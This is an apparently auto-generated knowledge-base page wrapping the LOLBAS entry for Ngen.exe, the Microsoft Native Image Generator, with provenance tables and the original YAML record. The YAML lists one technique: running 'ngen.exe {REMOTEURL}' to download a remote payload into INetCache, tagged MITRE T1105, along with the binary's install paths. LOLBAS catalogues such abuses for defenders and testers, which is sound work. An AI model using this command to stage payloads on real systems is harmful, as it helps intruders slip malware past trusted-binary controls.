---
parsed_by: focuslocust
source: lolbas
type: generated
---
# Ngen.exe

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Type | `tool` |
| Record ID | `ngen.exe` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OSBinaries/Ngen.yml` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [Ngen.exe](../../tools/windows/ngen.exe.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | ngen.exe |
| name | Ngen.exe |
| type | tool |
| source | lolbas |
| url |  |

## Preserved Source Material

```yaml
Acknowledgement:
- Handle: '@AvihayEldad'
  Person: Avihay Eldad
Author: Avihay Eldad
Commands:
- Category: Download
  Command: ngen.exe {REMOTEURL}
  Description: Downloads payload from remote server using the Microsoft Native Image Generator utility.
  MitreID: T1105
  OperatingSystem: Windows 10, Windows 11
  Privileges: User
  Tags:
  - Download: INetCache
  Usecase: It will download a remote payload and place it in INetCache.
Created: 2024-02-19
Description: Microsoft Native Image Generator.
Full_Path:
- Path: C:\Windows\Microsoft.NET\Framework\v2.0.50727\ngen.exe
- Path: C:\Windows\Microsoft.NET\Framework64\v2.0.50727\ngen.exe
- Path: C:\Windows\Microsoft.NET\Framework\v4.0.30319\ngen.exe
- Path: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\ngen.exe
Name: Ngen.exe
_source_path: /home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OSBinaries/Ngen.yml
```
